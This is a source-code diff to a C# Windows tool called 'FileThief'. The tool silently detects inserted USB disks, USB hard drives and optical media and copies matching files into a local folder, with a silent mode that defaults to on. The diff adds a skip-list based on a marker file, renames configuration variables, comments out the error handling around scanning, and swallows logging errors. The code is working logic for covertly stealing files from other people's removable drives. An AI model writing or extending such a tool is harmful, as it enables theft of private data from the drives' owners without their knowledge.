@@ -73,6 +73,8 @@ namespace FileThief
                 ClsMain.WriteIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
                 ClsMain.WriteIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
                 ClsMain.WriteIni("DriverType", "ROM", "0", ClsMain.StrConfig);
+
+                ClsMain.WriteIni("Device", "Whitelist", "1", ClsMain.StrConfig);
                 LoadSettings();
                 if (!Directory.Exists(Application.StartupPath + "\\Files")) Directory.CreateDirectory(Application.StartupPath + "\\Files");
                 if (!File.Exists(ClsMain.ConLogPath)) File.WriteAllText(ClsMain.ConLogPath, "FileThief 日志\r\n\r\n", Encoding.UTF8);
@@ -130,9 +132,11 @@ namespace FileThief
             ClsMain.ConStartup = ClsMain.ReadIni("General", "Startup", "0", ClsMain.StrConfig);
             ClsMain.ConSilent = ClsMain.ReadIni("General", "SilentMode", "1", ClsMain.StrConfig);
 
-            ClsMain.ConUSBDisk = ClsMain.ReadIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
-            ClsMain.ConUSBHD = ClsMain.ReadIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
-            ClsMain.ConROM = ClsMain.ReadIni("DriverType", "ROM", "0", ClsMain.StrConfig);
+            ClsMain.ConUsbDisk = ClsMain.ReadIni("DriverType", "USBDisk", "1", ClsMain.StrConfig);
+            ClsMain.ConUsbhd = ClsMain.ReadIni("DriverType", "USBHD", "1", ClsMain.StrConfig);
+            ClsMain.ConRom = ClsMain.ReadIni("DriverType", "ROM", "0", ClsMain.StrConfig);
+
+            ClsMain.ConWhitelist = ClsMain.ReadIni("Device", "Whitelist", "1", ClsMain.StrConfig);
         }
 
         public static void ScanFile(string driver, string[] volumeLabel, string[] extension, string regExp)
@@ -140,8 +144,13 @@ namespace FileThief
             if (driver != "")
             {
                 var mDirInfo = new DirectoryInfo(driver);
-                try
+                if (File.Exists(UsbDrive + ".ftwl") && ClsMain.ConWhitelist == "1")
                 {
+                    WriteLog("检测到 " + UsbDrive + " 存在白名单，退出",1,ClsMain.ConLogPath);
+                    return;
+                }
+                //try
+                //{
                     //Specified Volume Label
                     if (volumeLabel.Length >= 1 && volumeLabel[0] != "")
                     {
@@ -161,11 +170,13 @@ namespace FileThief
                         CheckIfAllFiles(extension, driver, mDirInfo, volumeLabel);
 
                     }
-                }
-                catch (Exception ex)
-                {
-                    if (ClsMain.ConLog == "1" && ClsMain.ConLogErr == "1") WriteLog(ex.Message, 1, ClsMain.ConLogPath);
-                }
+                //}
+                //catch (Exception ex)
+                //{
+                    //if (ClsMain.ConLog == "1" && ClsMain.ConLogErr == "1") WriteLog(ex.Message, 1, ClsMain.ConLogPath);
+                    // For Debug
+                 //   MessageBox.Show(ex.StackTrace);
+                //}
             }
         }
 
@@ -196,18 +207,25 @@ namespace FileThief
 
         public static void WriteLog(string content, int logType, string path)
         {
-            var dt = DateTime.Now;
-            using (var file = new StreamWriter(path, true))
+            try
             {
-                switch (logType)
+                var dt = DateTime.Now;
+                using (var file = new StreamWriter(path, true))
                 {
-                    case 0: // Info
-                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
-                        break;
-                    case 1: // Error
-                        file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
-                        break;
-                } 
+                    switch (logType)
+                    {
+                        case 0: // Info
+                            file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][信息] " + content);
+                            break;
+                        case 1: // Error
+                            file.WriteLine("[" + dt.ToString("yyyy年MM月dd日 HH:mm:ss", DateTimeFormatInfo.InvariantInfo) + "][错误] " + content);
+                            break;
+                    }
+                }
+            }
+            catch(Exception)
+            {
+                    
             }
         }
 
@@ -225,7 +243,7 @@ namespace FileThief
                 switch (d.DriveType)
                 {
                     case DriveType.Removable: // Removable Drivers (except USB Hard Disk)
-                        if (d.IsReady && ClsMain.ConUSBDisk=="1" && ClsMain.Status )
+                        if (d.IsReady && ClsMain.ConUsbDisk=="1" && ClsMain.Status )
                             {
                             UsbDrive = d.Name;
                             // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
@@ -238,7 +256,7 @@ namespace FileThief
                     case DriveType.Fixed:
                         if (isUsb) // USB Hard Disk
                         {
-                            if (d.IsReady && ClsMain.ConUSBHD == "1" && ClsMain.Status)
+                            if (d.IsReady && ClsMain.ConUsbhd == "1" && ClsMain.Status)
                             {
                                 UsbDrive = d.Name;
                                 // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
@@ -250,7 +268,7 @@ namespace FileThief
                         }
                         break;
                     case DriveType.CDRom: // CD/DVD ROM
-                        if (d.IsReady && ClsMain.ConROM == "1" && ClsMain.Status)
+                        if (d.IsReady && ClsMain.ConRom == "1" && ClsMain.Status)
                         {
                             UsbDrive = d.Name;
                             // If there's no volume label, use Name and Serial Number. eg: H (XXXXXXXX)
@@ -314,15 +332,14 @@ namespace FileThief
             CheckAllDriveType(usbDriveNames);
         }
 
-        public static void CopyFile(string oriFile,string saveDirectory)
+        public static void CopyFile(string oriFile,string desPath)
         {
             // Create Directory if Not Exists
             if (!Directory.Exists(ClsMain.ConPath + "\\" + UsbLabel))
                 Directory.CreateDirectory(ClsMain.ConPath + "\\" + UsbLabel);
-            if (!Directory.Exists(saveDirectory)) Directory.CreateDirectory(saveDirectory);
+            if (!Directory.Exists(Path.GetDirectoryName(desPath))) Directory.CreateDirectory(Path.GetDirectoryName(desPath));
             // Copy File
-            File.Copy(oriFile, oriFile.Replace(UsbDrive.Replace("\\", ""),
-                ClsMain.ConPath + "\\" + UsbLabel), true);
+            File.Copy(oriFile, desPath, true);
             if (ClsMain.ConLog == "1" && ClsMain.ConLogInfo == "1")
                 WriteLog("已复制 " + oriFile, 0, ClsMain.ConLogPath);
         }
